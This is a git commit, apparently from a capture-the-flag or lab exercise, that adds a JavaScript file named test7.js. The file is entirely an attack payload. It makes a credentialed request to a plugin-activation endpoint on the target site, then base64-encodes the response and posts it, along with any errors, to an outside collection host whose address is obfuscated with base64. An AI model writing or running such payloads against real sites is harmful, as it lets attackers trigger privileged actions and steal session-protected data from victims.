7027328861c7342e2cd8195327df1a0e6019443a
repierre <pierre.boudvil1@gmail.com>
2023-11-25 20:03:14 +0100

    a

---
+++ test7.js
@@ -0,0 +1,23 @@
+fetch("http://website-l8lruj.inst.malicecyber.com/activate-plugin/1", {
+    "credentials": "include",
+    "referrer": "http://website-l8lruj.inst.malicecyber.com/show-plugins",
+    "method": "GET"
+}).then(r => r.text())
+.then(r => {
+    fetch(atob('aHR0cHM6Ly9lb2pvY3d1a3hodWh6d3QubS5waXBlZHJlYW0ubmV0') + '/debug4', 
+        {
+            method: 'POST',
+            body: btoa(r)
+        }
+    )
+})
+.catch(e => {
+    fetch(atob('aHR0cHM6Ly9lb2pvY3d1a3hodWh6d3QubS5waXBlZHJlYW0ubmV0') + '/debug_err', 
+        {
+            method: 'POST',
+            body: e
+        }
+    )  
+})
+
+
